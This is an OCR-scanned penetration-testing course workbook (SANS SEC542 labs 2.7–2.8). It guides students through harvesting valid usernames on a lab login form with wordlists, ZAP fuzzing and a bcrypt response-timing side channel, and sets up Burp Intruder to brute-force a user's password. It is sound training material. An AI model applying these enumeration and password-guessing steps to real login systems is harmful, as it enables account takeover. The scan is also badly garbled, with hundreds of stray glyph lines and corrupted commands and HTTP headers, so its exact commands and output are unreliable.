'---' 
'-./ 
.._., 
'-"' 
'---' 
'--' 
'---' 
'---' 
'--' 
'-"' 
'----' 
'-"' 
'-._,, 
2 
'---' 
'-./ 
Enumerating Users 
Let's harvest valid usernames from this authentication form. 
You may reuse the previously created lastnames file or create a new one 
Open a terminal and type: 
$ gedit -/lastnames 
Create a file containing common American/English last names (surnames), and include a few last names 
from The Hitchhiker's Guide to the Galaxy for good measure. 
Please add the following names to the "'/lastnames file: 
beeblebrox 
dent 
prefect 
jones 
smith 
fastnames {·}-gedlt 
_, + X 
·~eeb leb rox 
tdent 
prefect 
[jnnes 
smith 
f---------·-··-------- 
•fain Text • 
Tilb Width: 8 • 
Ln 1, Col1 
INS 
Sec542 instructor Adrien de Beaupre (@adriendb) also wrote a script for this lab: user enum 
Quite similar to find_accounts but fuzzes a login form instead of home directories such as "'/adent 
r--- 
Run the following command: 
$ user enum -/lastn<llll.~s 
l 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
3 
The output will be similar to the find_ accounts script we ran during the previous lab. 
Same users, but leveraging a different discovery vector . 
T~rmhnd 
Terminal 
. zbeeb t ebrux 
adent 
fprefect 
hjones 
lsmith 
- + ~ 
File 
Found: 
Found: 
Found: 
Found: 
Found: 
[-1~ 
Tabs 
Let's improve our discovery rate by combining our -/lastnames list with the top 100 last names 
reported during the 2000 US Census:1 
/opt/wordlists/US-census2000-lastnames-top-100.txt 
We will also remove any duplicates. 
Combine the two wordlists and remove duplicate entries by typing the following command: 
'--' 
..._,, 
'-J 
'-J 
'-/ 
'-J 
$ cat /opt/wordlists/US-census2000-lastnames-top-100.txt -/lastnames 
I 
sort -u > -/combined 
Type as one continuous line with no breaks. 
Note: This command concatenates the two files, sorts them, and prints unique entries only (sort's "-u" 
flag). It then saves the results to "'/combined 
Another hallmark of professional penetration testing is efficiency: The names smith and jones appear on 
both lists, and there's no sense trying each twice. 
Then try the combined wordlist with user_enum: 
$ user enum -/combined 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'-..,/' 
'---' 
\..._,., 
'-.../ 
'-.../ 
'-..../ 
'---' 
'-J 
'---' 
'--._/
'--' 
'---- 
'-J 
'---' 
'-J 
....,, 
'-J 
'-' 
'-J 
'-' 
'---' 
'-J 
\..._,., 
'---' 
'-J 
'---' 
'---' 
\..._,., 
'--' 
'--' 
4 
'--' 
'--' 
'-' 
- + 
X 
.. 
(-] $ user enua =/combined 
Found: zbeeb Iebrox 
Found: adent 
Found: djohnson 
found: hjones 
Found: klewi.s 
Found: fprefect 
Found: lsmith 
Found: :swilliams 
[-1$ 
We found more names! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
5 
Let's Try the Second Form 
Launch Firefox and go to Exercises-> Advanced Username Harvesting. 
Ensure No Proxy is selected on the Proxy Selector toolbar. 
Try a bad username, bad password: 
• 
User: asdf 
• 
Password: asdf 
Then try a good username, bad password: 
• 
User: adent 
• 
Password: asdf 
Hmmm ... the responses appear to be identical, unlike the last step. 
Auufli;~d • IJ5ernam~Hi'I.JV5ting,·MoriUa Fir~f.ex: 
. 
.... 
-~ 
Advanced -username H ... x 
,;. 
X 
> + J ~ i.V\V1N.S!'JC542.org/userem ,Ml>e "' C 
'--"'--==----=...~--=--"'--- 
- - 
User 
Password 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'-' 
'--" 
'-' 
'-.../ 
''--'
\._.; 
'-' 
"'--'" 
'-../
'-../ 
'-.../
'--" 
'-.../ 
'-.../
'--' 
'--' 
'--' 
'--" 
'--" 
'-.../ 
'--" 
'--' 
'-.../ 
'--" 
'-../ 
'-.../ 
'-.../ 
'--' 
'-.../ 
'-.../ 
'-'" 
'-.../ 
'-../ 
'--" 
'---' 
'---' 
'---' 
'--" 
'-' 
6 
\,_, 
'--'" 
'-" 
Launch ZAP 
Launch ZAP by clicking the ZAP icon in the upper panel at the top of the screen: 
Note: ZAP takes a while to launch, roughly 10 seconds or so. Many students end up accidentally launching 
ZAP two or three times during the delay. Run one instance of ZAP only. 
Multiple instances of ZAP are running if you see this warning: 
In this case, close the additional ZAP instances, leaving the original. When in doubt, close all ZAP instances 
and start over. ZAP must be listening on port 8081 for this lab to work. 
r--. 
After ZAP starts, launch Firefox by clicking the Firefox icon in the upper panel. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
7 
Configure Firefox to use the running proxy: 
...__, 
...__, 
In Firefox, select ZAP from the Proxy Selector drop-down: 
+ X 
- 
= 
Auto-detect 
system Proxy 
Burp 
...__, 
...__, 
...__, 
...__, 
...__, 
'-' 
~ 
...__, 
...__, 
'-' 
...__, 
...__, 
Ensure ZAP is now chosen as the proxy. 
...__, 
...__, 
'--' 
'-" 
...__, 
We have already installed a Firefox extension called Proxy Selector. This enables you to quickly switch 
Firefox between various proxy servers. In this case, we have already configured proxy settings and saved 
them under the name ZAP. To activate the use of ZAP, simply select ZAP from the proxy list on the right 
side of the proxy bar at the top of the Firefox window. 
Note: Always use Proxy Selector to manage Firefox's proxy settings. Do not use other methods. 
Changing the system proxy settings can break future labs. Some system proxy settings attempt to proxy all 
protocols, even ICMP! 
...__, 
...__, 
'---' 
'---' 
This pull-down enables you to automatically configure the browser to use a given web app manipulation 
...__, 
proxy. 
...__, 
'---' 
'---' 
...__, 
...__, 
'-" 
'---' 
...__, 
'---' 
...__, 
...__, 
...__, 
'-" 
...__, 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
8 
\.J 
'-" 
'-" 
Let's Fuzz 
Note that we will repeat many of the ZAP fuzzing steps that we used in the previous directory browsing 
,......__ 
lab. 
In Firefox, go to Exercises-> Advanced Username Harvesting. Then retry a good username, bad password: 
• 
User: adent 
• 
Password: asdf 
In ZAP: 
Ensure the Filter is "OFF". If it is "ON": press the "Filter" icon, choose "Clear" and "Apply." 
Right-click the POST to http://www.sec542.org/userenum/securelogin.php 
Choose Attack and then click Fuzz ... : 
Contexts 
Default Context 
,. Ii Sites 
Y 
,~ http:Jtwww.sec542.org 
y 
j POST http:/ /'Ni//. sec542. org/use renum/secu re login. php HTTP/1. 1 
juser-Agent: Mozil.la/5.G (Xll; Linux i686; rv:50.0) Gecko/20100101 Firefox/ 
150.0 
Accept: text/html, spp Licat icn/xhte l-xa l, app 1ication/xml; q=O. 9, */*; q=O. 8 
Accept-Language: en-US,en;q=G.5 
Referer: http:/,l\,'i,,'w.sec542.org/userenum/securelogin php 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Search 
ft) Alerts 
1 1/20/18 1:.01:0... 
GET 
4 1120/18 1:01:1.... 
POST 
5 1/20/18 1:01:2... 
POST 
http://w'WW.sec542.org/ 
http:/Jwww.sec542.org/ 
http://'.ivww.sec542.org/ 
Include in Context 
Flag as Context 
Run application 
Exclude from Context 
Open/P.esend with Request Editor ... 
Exclude from 
Open URL in Browser 
Show in History Tab 
Open URL in System Browser 
Copy UP,ls to Clipboard 
Delete 
Manage Taqs.; 
~ Spider ... 
l1; Active Sc an ... 
£ Forced Browse site 
,"'f.t Forced Browse directory 
,"" Forced Browse directory {and children) 
AJA,X Spider .. ' 
044 bytes 
ii."ll Medium 
044 bytes ~ Medium 
IN ... 
! Tags 
Form, Pas . 
Form, Pas 
. 
Form, Pas . 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
9 
In the ZAP Fuzzer menu: 
\._,., 
Highlight the "a" in "adent". 
Be sure to highlight a single character only; we use this position to fuzz the first initial. 
Then click Add ... : 
Fuzz Locat/qns 
I Headae Teld: j."'.j ~ .. , 
-~--~ 
POST http:/ /w.t. sec 542. org/userenum/securelogin. php HTTP/1. l 
User-Aoent: Mozi lla/5. 0 (Xll; Linux i686; rv: 50. OJ Gecko/20100101 
Firefox/SO. 0 
Accept: text/html, app 1ication/xhtm l+xml, app lication/xml; q=B. 9, 
,8 
Language: en-US, en; q=O, 5 
: http:/ I~....,. sec542. org/userenum/secure login php 
ion: keep-a live 
-Insecure-Requests: 1 
-Type : application/x-ww-form-urlencoded 
-Length: 33 
, sec542. org 
user=ijdent&pass=a<;df,;button=Login 
Fuzz tocattona 
Va.,.j#1i. •. 
Click Add ... again on the next Payloads screen: 
,,. 
4 
X 
Location: Body {S, 61 
# of Processors ' 
confirmation 
•)l;_ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'--' 
'-----' 
:;:-;i 
'--' 
\__, 
'--' 
'--' 
'--' 
"-.,.., · 
'--' 
'--' 
'--' 
'--' 
"-.,.., 
'--' 
'--' 
\._,., 
.._, 
\__., 
'--' 
'->-' 
v 
'--' 
'-----' 
'--' 
\._,., 
'--' 
'--' 
'--' 
'--' 
'-----' 
'--' 
'--' 
'-----' 
'--' 
'-.,.., 
'--' 
10 
'--' 
"-.,.., 
'-' 
Add the Payload 
In the ZAP Add Payload menu, click the Type dropdown and select File Fuzzers: 
Type: 
Regex (*Experimental*) 
Script 
Strings 
Then, select: 
,,---, 
jbrofuzz (triangle not checkbox) -> Alphabets (triangle)-> English Alphabet (checkbox): 
Type: [ Ffle Fuzzers 
Files: 
. 
" ~jbrofuzz 
" @jAlphabets 
OASCII 85 Alphabet 
QASCII 94 Alphabet 
OASCII 95 Alphabet 
OAlpha Numeric 
Base32 (Extended HEX) Alphabet 
OBase32 Alphabet 
Base64 (URUFile Safe) Alphabet 
Base64 Alphabet 
Base 
., Omology 
• OBuffer Overflows 
"' OExploits 
"' OFormat String Errors 
1;'1 
--~~=,,,,__, 
-'--' 
We specify clicking the triangle expansion icon next to jbrofuzz because clicking the check box next to 
jbrofuzz selects every jbrofuzz payload. We want only one in this case. The same is true for Alphabets; we 
,-., 
only want one: English Alphabet. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
11 
,,---, 
Lab 2.7: Username Harvesting 
'--' 
Click Add: 
"' 
Add P.ayf °'ad 
+ 
X 
Type: [ File Fuzzers 
Fifes: 
'--" 
'--" 
Payloads 
,.. LJBase 
"'0Biology 
,.. 0 Buffer Overflows 
,.. OExploits 
,.. 0Format String Errors 
" 
English Alphabet 
1: a 
2: b 
3: C 
4: d 
5: e 
6: f 
7: g 
8: h 
9: i 
10: j 
r"' r, 
.... 
.... 
Click OK on the Payloads screen: 
Location: 
Value: a 
Payload's: 
~ 
• i Type 
lo~~~rr~tr~~jclt ~f Processors ~s{ 
Add .. 
1 
File Fuzz.. English A... 
O ii..· 
Rt:t:nove 
Cancel 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'--" 
'--' 
'--' 
'--' 
'--" 
'--" 
'--" 
'--" 
'--" 
'--" 
'--" 
'--" 
'-..,I 
'--" 
'--' 
'-" 
'-' 
'--" 
'--" 
'-' 
'--" 
'-' 
'--" 
'-' 
.__, 
'--" 
'--" 
'-" 
'--" 
'--" 
'--" 
'--" 
'-" 
'-.., 
'--- 
'--" 
12 
'--" 
'--" 
'-' 
Fuzz the Last Name 
In the ZAP Fuzzer menu, highlight the "dent" in "adent". 
Click Add ... : 
Fuzz tocsnons. 
:POST http: /rve«. sec 542. org/userenum/securelogin, php HTTP/1.1 
!user-Agent: Mozilla/5,0 (Xll; Linux i686; rv:50.0) Gecko/20100101 
Fi refox/50, O 
Accept: text/html, app Ii cati.on/xhtn l+xml, app lication/xml; 
,8 
Accept -Language: en-US, en; q-0, 5 
Ref erer 
ttp: //vrw, sec542, org/use ranun/sscu re login, php 
: keep-alive 
ecure-Requests: 1 
e: app Licat ion/x-vw-fo rm - urlencoded 
gth: 33 
c542. crq 
/\ 
Click Add ... again on the next Payloads screen: 
Location: Body E6. 10) 
Value: dent 
Payloads: 
i Description # of Process 
Add ... 
Bott._ . .,, 
Ill Remove without conflnnation 
cancel 
OK 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
13 
Add the Payload 
In the ZAP Add Payload menu, select Type: File. 
Type: .~
- ~:;=,;;:~==~;;~·~;;;;. 
Chara File Fuzzers 
Nurnberzz 
Regex (*Experimental*) 
Script 
Strings 
Comment To 
Ignore Empty lines: 
tgnore First Line: 
Payloads 
Cancel 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
'-.../ 
'--' 
\...., 
____, 
____, 
'-../ 
'--' 
.'-../ 
'-./ 
,._, 
____, 
'-./ 
'-./ 
'-.--" 
'-./ 
'-../ 
\....., 
'-../ 
'-../ 
____, 
'-../ 
'-./ 
--.._/ 
--.._/ 
'-../ 
'--' 
'--' 
'--' 
'-./ 
'-./ 
'-../ 
____, 
'--" 
'-./ 
'-../ 
'-../ 
'-../ 
'-./ 
\....., 
14 
--.._/ 
'-./ 
'-../ 
Then, select /home/ student/ combined, and click Add. 
I\ 
File: 
/home/student/combined 
select., 
; Character Encoding: l,._.u_T_F_-8_
· -~----------~-·-'-1__,,Tj 
lrrmt: 
Value: 
comment-rekem 
Ignore Empttlines: 
Ignore 
Line: 
l 
Payloads Preview: 
adarns 
alien 
anderscn 
bailey 
baker 
barnes 
baeblebrox 
bell 
bennett 
brooks 
brown 
'f 
l h'] Save, .. 
Cancel 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
15 
Then, click OK on the Payloads screen: 
• 
Payloads 
Locat.ion: Body(6. 
Value: dent 
Paytoads: 
Description I 
Processors 
combined 
0 
@'J Remove without confirmation 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2. 7: Username Harvesting 
'-.../ 
'-.../ 
.___., 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-' 
\...., 
'-' 
'-' 
'-.../ 
\...., 
\...., 
'-.../ 
\...., 
'-.../ 
'-' 
\...., 
'-.../ 
'-' 
\___, 
'-' 
'-.../ 
'-.../ 
'-' 
'-.../ 
'-' 
'-.../ 
'-.../ 
''-' 
'.../ 
'-.../ 
..__..,, 
'-.../ 
'-' 
'-.../ 
16 
'-.../ 
'-./ 
'-.../ 
Start Fuzzer 
Click Start Fuzzer, and ZAP starts fuzzing. This round takes longer than the previous lab because we are 
fuzzing more than 2,600 entries (103 last names, times 26 letters). 
+ 
POST http://i.w.sec542.org/userenum/securelogin.php HTTP/1.l 
User-Agent: 
Mozilla/5.0 (Xll; Linux i686; rv:50.0) Gecko/20100101 
Firefox/SO. o 
Accept: text/html, app lication/xhtm1+xm l, app l i cat ion/xnl . q=O. 9, */*; 
.8 
Accept-Language: en-US,en;q=0.5 
Referer: http: //>,tw. sec542. org/userenum/securelogin. php 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Content-Type: app l icat ion/x-vev- form-url.encoded 
Content-Length: 33 
Host: vv«, sec542. o rg 
Payloads ... 
user=ffi'ldent&pass=asdf&button=Login 
Remove without conftrmaticn 
Processors ... 
' cancel 
"' 
Following is the default output, with some columns adjusted for readability: 
Progress: [ 0: HTTP - h!!:':f~=~·sec=::.;.;;;:u;;;re;;,;l;.0;;1;gi::,:n-,;t·P~~:r:P~L::..~~===....:::.=====:.__~-=:..:..:::..:.::._==:.:...::::._..::::.~ 
Messages Sent: 2678 
Errors: O 
Al! Show Errors 
Message .. , j Code 
I Reason 
! RTT 
j Size Res, .. 
I Size Resp. B, .. 
: High, .. ! State 
: Payloads 
Original 
200 OK 
27... 
250 bytes 
1 Fuzzed 
200 OK 
17... 
250 bytes 
249 bytes 
250 bytes 
250 bytes 
250 bytes 
249 bytes 
249 bytes 
249 bytes 
249 bytes 
249 bytes 
2 Fuzzed 
200 OK 
17 ... 
3 Fuzzed 
200 OK 
7 ms 
4 Fuzzed 
200 OK 
8 ms 
5 Fuzzed 
200 OK 
9 ms 
6 Fuzzed 
200 OK 
7 ms 
7 Fuzzed 
200 OK 
6 ms 
8 
Fuzzed 
200 OK 
2 ms 
g 
Fuzzed 
200 OK 
4 ms 
10 Fuzzed 
200 OK 
6 ms 
Alerts ~o (t 1 f1J2 i,\ll•O 
1.044 bytes 
1.044 bytes 
1,044 bytes 
1,044 bytes 
1,044 bytes 
1,044 bytes 
1,044 bytes 
1.044 bytes 
1.044 bytes 
1,044 bytes 
1.044 bytes 
t/JM ... 
() Reflected 
() Reflected 
{) Reflected 
() Reflected 
() Reflected 
(;; Reflected 
\) Reflected 
0 Reflected 
r;) Reflected 
0 Reflected 
Current Scans 
a, adams 
a, alien 
a, anderson 
a, bailey 
a, baker 
a, barnes 
a, beeblebrox 
a, bell 
a, bennett 
a, brooks 
l 
l 
,. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
17 
'-' 
Find the Valid Users 
'-J 
'-J 
Every attempt generates a 200 HTP response code, both successful and failed: 
This is a common issue. 
Responses look identical. 
Try sorting by the RTT (Round Trip Time) column, largest to smallest: 
'----' 
'-J 
\.../ 
\.../ 
'-' 
\.../ 
586 
766 
l, 079 
Fuzzed 
o 
Original 
353 
Fuzzed 
2,582 
Fuzzed 
1,220 
Fuzzed 
51 
Fuzzed 
1,612 
Fuzzed 
200 
OK 
200 
OK 
200 
OK 
200 
OK 
200 
OK 
200 
OK 
200 01( 
200 OK 
200 
OK 
369 ms 
341 ms 
317 ms 
248 bytes 
316 ms 
249 bytes 
305 ms 
248 bytes 
303 ms 
248 bytes 
299 ms 
248 bytes 
35 ms 
248 bytes 
21 ms 
247 b)_li:es 
1.02 KiB 
1.02 KiB 
1.02 KiB 
1.02 KJB 
1. 02 KJB 
1.02 KJB 
1.02 KiB 
1. 02 k1B 
1. 02 KJB 
\.../ 
\.../ 
P,eflected 
Reflected 
P,eflected 
Reflected 
Reflected 
d, [ohnson 
z, baeblebrox 
I, smith 
a, lopez 
p, perry 
'---' 
\.../ 
'-' 
'-' 
\.../ 
'-' 
'-' 
Your RTT (round trip time) numbers and the order of users listed will differ somewhat from the preceding 
screenshot. You should see that the RTI (round trip time) for valid users is more than ten times greater 
than the RTI for invalid users. 
Note: The timing results are highly dependent on your local system load: The host, VM, CPU load, RAM 
usage, etc. Sometimes non-valid users have higher round trip times due to these kinds of load issues. This 
is very realistic compared to results we encounter in the real world (especially when you add Internet 
latency to the list of factors). 
If you see other (non-valid) accounts with higher RTis that may cloud the results, run the test again. You'll 
see that valid users always have longer RTis, but a handful of (different) accounts may appear each time 
you test. In the real world always test multiple times to identify these types of outliers. 
We now have a list of valid users: adent, djohnson, fprefect, hjones, klewis, lsrnith, swilliams, and 
zbeeblebrox. The "original" request was adent, which is why it is also included. 
\.../ 
\.../ 
\.../ 
\.../ 
\.../ 
'-' 
'-' 
\.../ 
\.../ 
\.../ 
'---' 
\.../ 
'-' 
'-' 
\.../ 
\.../ 
'-._.,, 
'-../ 
'-' 
"---' 
'-../ 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
18 
'-' 
'-._.,, 
\.../ 
Why Does This Timing Attack Work? 
Our results show: 
Valid users RTT: > 200 ms. 
Invalid:< 50 ms. 
These are rough numbers, depending on the speed of your hardware, and more. 
See note on previous page that discusses local system load issues. 
This works because the web developer used bcrypt to hash passwords for good usernames only: 
Here is the PHP code that results in a timing attack: 
if($usergood == 1}{ 
$options= [ 
'cost' => 12, 
] ; 
$hash=password_hash("$pass", PASSWORD_BCRYPT, $options} .11\n"; 
} 
We set the cost (number of bcrypt rounds} in the PHP application to 12 to ensure consistent results. This is 
also a setting commonly used by security-minded web developers. 
Using default settings results in a smaller, but still noticeable, timing difference. However, with a higher 
incidence of false positives. These results were generated with the default bcrypt cost of 10: 
le 
' 
::J!tii!iiµ 
,J,ti l ,ti Current fuzzers: O 
Messages Sent: 2678 
Errors: O 
~ Show Errors 
€1 Export 
1~T_a_sk_l_D_1 ..... 
'M_e_ss_a __ 
g_e. __ 
.. --i_co_d_e_-'--
IR_e_a_so_n_-'-iR=TT~
····•--""'--~----l_s_
tze_R_e_s_p._B_"_·~lH_
· 
ig_h_ 
.. _
· .__s_ta_t_e 
f_Pa_y_
lo_ad_s 
....,l5if 
o 
200 OK 
276 ms 
1,044 bytes 
P>il M ... 
200 OK 
190 ms 
1.044 bytes 
1,044 bytes 
OK 
200 OK 
200 OK 
94 ms 
249 bytes 
80 ms 
249 bytes 
74 ms 
249 bytes 
0 Reflected 
y, Ortiz 
j, lee 
a, edwards 
Current Scans GO • O 
Notice that the false positives closest to the actual results look to have occurred at about the same time in 
this case. Requests 1327 and 1329 were false positives as were 2518 and 2536. Suspect the system was 
under slightly more (but enough} load around those times, which caused the slower RTTs. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
19 
..__, 
Final Step 
\J 
'--' 
Be sure to disable the ZAP proxy setting in Firefox so that it does not interfere with future labs. 
Go to the Firefox Proxy Selector drop-down and choose No Proxy. 
tmterdetect 
, 
SANS Security 542 - Web Pei 
ii 
Ethical Hacking 
B
~P ~~~ 
and~o1 
[fiectrtbl~ed 
..... ,,,,,, '''''''''''''' 
'' 
~ 
zac 
I~ 
i 
ap 
IShellshock , netstat.cgi 
1 
Prnxles 
!Web Authentication - Basic j 
Web Authentica ti.on - Dig:est 1 
. 
, 
Ensure No Proxy is set when complete. 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
'-" 
'-../ 
'-" 
'-" 
-.J 
'-..,/ 
'-../ 
'-..,/ 
'-" 
'-" 
'--' 
'-" 
'-" 
'-" 
'-" 
'-" 
'-../ 
'-../ 
'-" 
'-" 
'-../ 
'-../ 
\__,/ 
'-../ 
'-" 
'-" 
'-../ 
.,____,, 
'-" 
'-" 
'--' 
'--' 
'-../ 
'-' 
'-' 
,__,I 
20 
'-../ 
'-" 
'--' 
j References 
[1] http://www.census.gov/topics/popu1ation/genealogy/data/2000_surnames.html 
( https:// cyber.gd/542 _ 258) 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.7: Username Harvesting 
21 
• 
Gain experience with Burp Intruder 
• 
Understand Intruder positions and payload 
• 
Use Burp to attack the password input of an authentication form 
Launching Burp 
,,.., 
Launch Burp by clicking the Burp icon in the upper panel: 
,,--, 
Wait for Burp to launch. 
Run one instance of Burp only. Multiple instances of Burp are running if you see this warning: 
Your temporary directory corrslns the !ottowlng folders which appear to have been previOm:ly generated by Burp. Would you like to delete these? 
Note: you should not de!ete these files i! another instance o! Burp is currently running. 
wed Jan 17 08:26:35 PST 2018 ;tmp/burp7S441616!33053W404.tmp 
wedji:ln 17 08:26:35 PST 201.s /1:mpJburpl.458118343269081906.tmp 
wed Jan 17 08:26: 35 PST 2 01 s /trnp;bu.rp3975f:ic32 966637 475085.trnp 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
1 
In this case, choose Leave and then close the newest Burp instance, leaving the original. When in doubt, 
close all Burp instances and start over. 
Warning: Burp must be listening on port 8082, and the Burp instance that generates the preceding error 
cannot bind to port 8082 because it is in use by another instance. 
Then choose Burp in the Firefox Proxy Selector menu: 
- + X 
,w,rw.sec542.org ~=====~! 
~ fxen::Ises.,, f Mutillldae i.,~ bWAPP 11J DVWA! .,,, No Proxy 
nuto-detecr 
SANS Security 542 - Web Pe~ 
system Proxy 
C 
J~leedEthiral Hoc£itt!j 
[:~]!snake 
- - - 
~llshock - netst~!:cgi. 
i !i Manage Proxies 
1~W~e~b~~A~u~th~e~n~t~ic='===a~t~1· o~n~·=- B~
a~s.i~c=1L. ·~ 
f 
~ 
; ;.z; ere erences 
Web Authentication - Di_g_est 
1 
• 
· 
·· 
,1 
Refresh the page in Firefox to prime Burp: 
www.sec542.orgj 
.-,,,,.,..,a.,,,. t , .. n 
,,. ~ bWAPP IJ.D~A 
Burp• 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
..__,, 
.,___; 
.,___; 
.,___; 
--...., 
'-' 
..__,, 
..__,, 
'-' 
'-' 
'-' 
"'--' 
..__,, 
'-' 
'-' 
'-' 
..__,, 
'--' 
'-' 
'-' 
'-' 
'-' 
'--' 
\__,, 
\__,, 
'--' 
'-' 
'---' 
'-' 
'-' 
'-' 
'--' 
'-' 
'-" 
'-' 
'-...., 
'-' 
'-' 
'-"' 
'--' 
2 
'-"' 
'-" 
'-' 
I challenge: No Hints 
Target User: adent 
Password dictionary': /opt/wordlists/splashdata-worst-passwords-2016. txt 
,....._ 
Perform the following steps: 
• 
Firefox: Go to the Exercises tool bar and choose Web Authentication - Forms 
• 
Generate a failed login by attempting to log in with username: adent, password: asdf 
,....._ 
• 
Using Burp, fuzz the HTIP POST to /form_auth/login.php with Burp Intruder 
Step-by-step instructions begin on the next page. 
Choose your own difficulty! 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
3 
jstep-by-Step Instructions 
\,_; 
Seeding Burp 
\,_; 
'-' 
We use a good username with a bad password, and will intentionally fail to log in to provide Burp with the 
proper entry to fuzz. 
In Firefox: Go to the Exercises toolbar and choose Web Authentication - Forms. 
Attempt (and fail} to log in to the form: 
• 
Username: adent 
• 
Password: asdf 
Then click Login. 
You will see the error "Incorrect username or password." 
'-" 
'-' 
'-" 
'-' 
'-' 
'-" 
'-" 
'-' 
- + "' 
el Burp v 
·'5-· 
it( 
11 ~ - 
= 
Error 
Incorrect nsername or password 
Please try again 
'-" 
'-" 
'-" 
'-" 
'--' 
'-" 
'--' 
'---' 
'-..-' 
'-" 
'--' 
'-' 
Switch to Burp and right-click this POST: 
POST /form_auth/login.php HTTP/1.1 
'-' 
'---' 
\,_; 
'---' 
'---' 
'---' 
'---' 
'---' 
'-' 
'-" 
'-' 
'-" 
'---' 
'-" 
SEC542 -© 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
4 
'--' 
'-' 
Target 
Proxy 
Spider 
Scanner 
Intruder 
Repeater 
Sequencer 
Decoder 
Comparer 
Extender 
Options 
Alerts 
Jsitetl'tflp~ 
Filter: Hfding out of scope and not found items; hiding CSS, image and general binary content; hiding 4)0( responses; hiding ernptytolcers 
v 
http://www.sec542.org 
• l".ll! form_auth 
l Host 
! Method I URL 
(http:J/www.sec542.org ... J'OST 
/form_auth/lg_gin.phE.,.,. __ 
i 1---=-~'--,:;_'---=---a-s_s= 
__ -a-s""df""&""b_u_tt_o_n_=_L_o _ _,ir-, ---, :-
1 ~-;1;=·= .. =··-:;~;;;;::=:;:;:-:---:-:;;:..;;.'--___,,.--,--,-~2--:---:---:------,.--=,~--:---:---:--:.-:.-=:·c...::7'- .. -:'"-:' ~'-':-'
>:'! 
_[ aeqsest J Respons~ J 
· .... ~ 
Pararns J Headers [Bex] 
, POST /form_auth;login.php HTTP/1.1 
J Host: www. sec542. o rg 
'user-Agent: 
Mozilla/5.0 (Xll; t.inux i686; rv:50.0) 
Gecko/20100101 
Firefox/50.0 
Accept: text/html, app Li cat i cnyxhtrnl+xml , app lication/xml; q=O. 9, */*; q=O. 8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Referer: http: //ww,1. sec542. org/form_auth/form_auth. html 
Connection: close 
Upgrade-Insecure-Requests: 1 
Content- Type: app lication/x-www- form- urlencoded 
,,. 
[1-) [ < ] [+] f ;-] j Type a search term 
o matches 
Note: Be sure to choose the POST and not the GET. Burp's Request window (Raw tab) shows the request 
we will fuzz (you might need to scroll down to see the request): 
user=adent&pass=asdf&button=Login 
Then choose Send to Intruder. 
J TDl'l,J~t Proxy 
Spider 
Scanner 
Intruder 
Repeater Sequencer Decoder 
Comparer Extender 
Options Alerts 
I" · 
http://www.sec542.org 
Tr:. tormautn 
D tcrmauth.htm 
v 1jl login.php 
__ '. user=adent&pass=asdf&bQ!ULJtt,on;~LJ:lgiO.,:;r;~~-~P~O~
S~T~:~u:s:e:.r~=~a:d~e~n:;t~&~p~a:s~s:=~a;~s;d~f~&~b~u!t~to~n~=~
L~o~g~in~===i~;.~_:;;;_:_:_:_:--=--=--=--=--=--=--=--=.;-,J 
Remove from scope 
Host 
http://'W"!W:-~ec542.org 
CSS, image and general binary content: hiding 4xx responses; hiding empty folders 
Spider from here 
20100101 
Ctrl+R 
Send to Sequencer 
q=0.9,*/*;q=0.8 
SEC542 - © 2018 Seth Misenar and Eric Conrad 
Lab 2.8: Fuzzing with Burp Intruder 
5 
Burp Intruder 
In Burp, click the Intruder tab. The text in that tab will turn yellow/orange for a short time after Send to 
Intruder is chosen (on the previous page), and then it will turn back to black. 
Click the Positions tab. 
Decoder 
I 
Comparer 
I 
Extender 
Spider 
I 
Scanner 
Options 
Positions 
Configure the positions where payloads wiH be inserted into the 
base request. The attack type determines the way in which 
payl.oads are assigned to payload positions - see help for full details. 
Attack type: [ Sniper 
. 
j 
Host: ·,,r.rw. sec542. o rg 
User-Agent: Mozilla/5.0 (Xll; Linux i686; rv:50.0) 
Gecko/20100101 Firefox/50.0 
Accept: 
text/html,application/xhtml+xml,appl1cation/xml;q=0.9 
,*/*;q=O.B 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
R;if ere r: 
http://www.sec542.org/form_auth/form_auth.html 
Connection: close 
Upgrade- Insecure - RBquests: 
1 
Content-Type: application/x-w'w-w-form-urlencoded 
Content-Length: 33 
3 payload positions 
o matches 
Length: 492 
Start attack ) 
' 
, 
[ 
Auto§ 
R.efresh 
Clear 
Note that Burp has automatically identified three positions to fuzz, highlighted in orange. It uses the"§" 
character (called a section symbol) to delineate each field: 
user=§adent§&pass=§asdf§&button=§Login§ 
